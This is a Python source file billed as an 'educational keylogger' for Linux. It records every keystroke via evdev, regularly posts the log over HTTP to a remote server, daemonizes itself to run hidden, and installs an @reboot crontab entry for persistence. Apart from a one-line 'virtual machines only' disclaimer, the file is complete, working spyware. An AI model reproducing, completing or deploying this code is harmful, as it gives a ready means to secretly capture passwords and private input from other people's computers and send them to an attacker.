#!/usr/bin/env python3
"""
Educational keylogger with multiple features.
Use only in a controlled environment such as virtual machines.
"""

#######################################
# #       Import Libraries        # #
#######################################

import os
import sys
import json
import time
import atexit
import datetime
import subprocess

# ------------------------------------------------------------
# Import third-party libraries and configure python virtual environment
# ------------------------------------------------------------

VENV_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger_env")
REQUIRED = ["evdev", "requests"]

def in_venv():
  # Detect if we are already in a virtual environment
	return (hasattr(sys, "real_prefix") or (sys.prefix != sys.base_prefix))

def bootstrap_venv():
	# Creates the venv, install dependencies and re-execute the script within it if necessary
	if in_venv():
		return #Estamos dentro
	print("No virtual environment found. Creating it...")
	if not os.path.exists(VENV_DIR):
		subprocess.run([sys.executable, "-m", "venv", VENV_DIR], check=True)

	pip_path = os.path.join(VENV_DIR, "bin", "pip")
	python_path = os.path.join(VENV_DIR, "bin", "python")
	print("Updating pip and setupyools in the venv...")
	subprocess.run([python_path, "-m", "pip", "install", "--upgrade", "pip"], check=True)
	subprocess.run([python_path, "-m", "pip", "install", "setuptools==75.8.0"], check=True)

	print("Installing dependencies...")
	subprocess.run([python_path, "-m", "pip", "install"] + REQUIRED, check=True)

	print("Re-executing within the venv")
	os.execv(python_path, [python_path] + sys.argv)

bootstrap_venv()

print(f"Executing on: {sys.prefix}")

# Importing the remaining libraries
import threading
from evdev import InputDevice, categorize, ecodes, list_devices
import requests




#######################################
# #             Variables           # #
#######################################

# ------------------------------------------------------------
# Configuration
# ------------------------------------------------------------
CONFIG_FILE = "config.json"

DEFAULT_CONFIG = {
    "log_file": "keylogger.log",
    "remote_url": "http://<IP>:<Port>/log",  # IP where the file will be sent. 
    "send_interval": 60,               # Time interval to send the file (default 60 seconds).
    "max_log_size_mb": 0.01,              # Rotates the file when it surpases the size (default 10kb)
    "daemon": True,                    # If True it is executed as a daemon in the background.
    "persistence": True,               # If True it adds itself to the Crontab file.
    "terminate_key": "<esc>",           # Key to stop the keylogger.
    "timestamp_format": "%Y-%m-%d %H:%M:%S" # Timestamp format for each keystroke.
}


#######################################
# #             Functions          # #
#######################################

def load_config():
	"""Loads the configuration of the JSON file if it already exists or it creates a new one with the assigned configuration."""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
   
        for key, value in DEFAULT_CONFIG.items():
            config.setdefault(key, value)
    else:
        config = DEFAULT_CONFIG.copy()
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        print(f"Config file created: {CONFIG_FILE}")
    return config


# ------------------------------------------------------------
# Daemonization (Only for Unix).
# Separates the terminal process and executes it in the background
# ------------------------------------------------------------
def daemonize():
    if os.fork() > 0:
        sys.exit(0) 
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)
    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'w') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())


# ------------------------------------------------------------
# Persistence (crontab)
# Adds a recurring script to the user's crontab to run when the computer restarts
# ------------------------------------------------------------
def add_persistence(script_path):
    try:
        # Chekcs if the line already exists in the crontab file
        existing = subprocess.check_output("crontab -l", shell=True, text=True, stderr=subprocess.DEVNULL)
        if script_path in existing:
            return  # The line exists
    except subprocess.CalledProcessError:
        existing = ""  # No crontab yet

    # Adds the line to the script
    cron_line = f"@reboot /usr/bin/python3 {script_path} >/dev/null 2>&1\n"
    new_cron = existing + cron_line
    with open("/tmp/current_cron", "w") as f:
        f.write(new_cron)
    subprocess.call("crontab /tmp/current_cron", shell=True)
    os.remove("/tmp/current_cron")
    print("Persistence added.")


#######################################
# #              Clases             # #
#######################################

# ------------------------------------------------------------
# Keylogger Class
# ------------------------------------------------------------
class Keylogger:
    def __init__(self, config):
        self.config = config
        self.log_file = config["log_file"]
        self.remote_url = config.get("remote_url")
        self.send_interval = config.get("send_interval", 60)
        self.terminate_key = config.get("terminate_key")
        self.timestamp_format = config.get("timestamp_format")
        self.max_log_size = config.get("max_log_size_mb", 1) * 1024 * 1024


        # Opens the log file on "append" mode
        self.output = open(self.log_file, "a")

        # The timer starts to allow the file to be send periodically
        self.last_send = time.time()

        # Register to clean the terminal
        atexit.register(self.cleanup)

        # Detects the keyboard
        self.device = self._find_keyboard()
        if self.device is None:
            print("ERROR: No keyboard found")
            sys.exit(1)

        print(f"Using device: {self.device.name}")

        # Control variables for the listener and the infinite loop
        self.running = True
        self.listener_thread = threading.Thread(target=self._event_loop, daemon=True)
        self.listener_thread.start()

    def _find_keyboard(self):
        """Searches for the first device that looks like a keyboard"""
        devices = [InputDevice(path) for path in list_devices()]
        for dev in devices:
            if "keyboard" in dev.name.lower():
                return dev
        return None


    def _event_loop(self):
        """Reads events in a different thread"""
        for event in self.device.read_loop():
            if not self.running:
                break
            if event.type == ecodes.EV_KEY:
               key_event = categorize(event)
               # Only process key downs, ignores repetitions and key releases
               if key_event.keystate == 1:
                   self.on_press(key_event)



    def on_press(self, key_event):

        print(f"Tecla: {key_event}")
        # Callback for the keystroke event
        try:
            timestamp = datetime.datetime.now().strftime(self.timestamp_format)

            # Obtain the key's name (e.g. "KEY_A")
            keycode = key_event.keycode
            """Format for the log."""
            if keycode.startswith("KEY_"):
                key_str = keycode[4:] # Remove the KEY_
                if len(key_str) == 1:
                     # If the key is a letter use the lowercase form.
                     keystr = key_str.lower()
                else:
                    # Special keys inside brackets
                    keystr = f"[{key_str.lower()}]"
            else:
                keystr = f"[{keycode}]"

            line = f"{timestamp} - {keystr}\n"

            self.output.write(line)

            self.output.flush()


            # Check the log rotation
            self.check_rotation()

            # Sends the log periodically when the time is up
            if self.remote_url and time.time() - self.last_send > self.send_interval:
                self.send_file(self.log_file)

            # Stops if the assigned key on the JSON file is detected
            if self.terminate_key:
                # Converts the termination key into its evdev equivalent
                term_code = self._terminate_key_to_code(self.terminate_key)
                if term_code and key_event.keycode == term_code:
                    print("Termination key detected, stoping...")
                    self.running = False

        except Exception as e:
            # Prints error
            print(f"Callback error: {e}")


    def _terminate_key_to_code(self, key_str):
        """Converts a chain like <esc> into its evdev keycode"""
        # Common names
        mapping = {
            "<esc>": "KEY_ESC",
            "<enter>": "KEY_ENTER",
            "<space>": "KEY_SPACE",
            "<tab>": "KEY_TAB",
            "<backspace>": "KEY_BACKSPACE",
            "<delete>": "KEY_DELETE",
            "<up>": "KEY_UP",
            "<down>": "KEY_DOWN",
            "<left>": "KEY_LEFT",
            "<right>": "KEY_RIGHT",
            "<shift>": "KEY_LEFTSHIFT",
            "<ctrl>": "KEY_LEFTCTRL",
            "<alt>": "KEY_LEFTALT",
        }
        key_lower = key_str.lower().strip("<>")
        return mapping.get(key_lower, None)


    def check_rotation(self):
        # Rotates the log file when it surpases the max size configured
        try:
            if os.path.getsize(self.log_file) > self.max_log_size:
                self.output.close()
                old_file = self.log_file + ".old"
                os.rename(self.log_file, old_file)
                os.remove(old_file)

                self.output = open(self.log_file, "a")
        except Exception as e:
            print(f"Rotation error: {e}")

    def send_file(self, filepath):
        """Sends the .log file to a remote server through HTTP POST"""
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            # Sends the content
            requests.post(self.remote_url, data=content, timeout=5)
            self.last_send = time.time()
        except Exception as e:
            print(f"Failed to send {filepath}: {e}")


    def cleanup(self):
        """Closes the file and it is send one last time"""
        self.running = False
        if self.remote_url:
            self.send_file(self.log_file)
        self.output.close()
        if hasattr(self, 'device'):
            self.device.close()
        print("Keylogger stopped.")


#######################################
# #              Main               # #
#######################################

def main():
    config = load_config()

    #Forces the creating of the log file into the directory /tmp
    config["log_file"] = os.path.join("/tmp", os.path.basename(config["log_file"]))

    # Executes the daemonization (if assigned)
    if config.get("daemon"):
        daemonize()

    # Executes persistence (if assigned)
    if config.get("persistence"):
        script_path = os.path.abspath(sys.argv[0])
        add_persistence(script_path)

    # Creates and execute the keylogger
    kl = Keylogger(config)
    print("Keylogger inicado. Presiona Ctrl+C para detener.")
    print(f"Log file: {kl.log_file}")
    print(f"El archivo existe? {os.path.exists(kl.log_file)}")
    # Keeps the main thread alive while the listener is up
    try:
        while kl.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        kl.cleanup()
        sys.exit(0)


if __name__ == "__main__":
    main()
